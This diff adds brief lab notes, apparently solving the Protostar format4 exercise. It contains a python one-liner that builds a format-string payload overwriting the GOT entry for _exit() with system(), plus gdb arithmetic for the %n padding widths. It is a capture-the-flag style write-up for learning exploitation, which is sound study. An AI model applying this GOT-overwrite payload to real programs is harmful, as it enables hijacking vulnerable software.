@@ -1,0 +1,24 @@
+We need overwrite GOT table.
+--> Overwrite _exit() address with system() address
+
+python -c 'print "\x24\x97\x04\x08"+"\x25\x97\x04\x08"+"\x26\x97\x04\x08"+"\x27\x97\x04\x08"+"%164x%4$n%208x%5$n%128x%6$n%260x%7$n"' > pro4_dma
+
+Nice trick to caculate address 
+user@protostar:/opt/protostar/bin$ gdb -q
+(gdb) p 0xb4 - 0x00000010
+$1 = 164
+(gdb) p 0x84 - 0xb4
+$2 = -48
+(gdb) p 0x184 - 0xb4
+$3 = 208
+(gdb) p 0x04 - 0x84
+$4 = -128
+(gdb) p 0x104 - 0x84
+$5 = 128
+(gdb) p 0x08 - 0x04
+$6 = 4
+(gdb) p 0x108 - 0x04
+$7 = 260
+
+Get value of this address to overwrite and sub. 
+
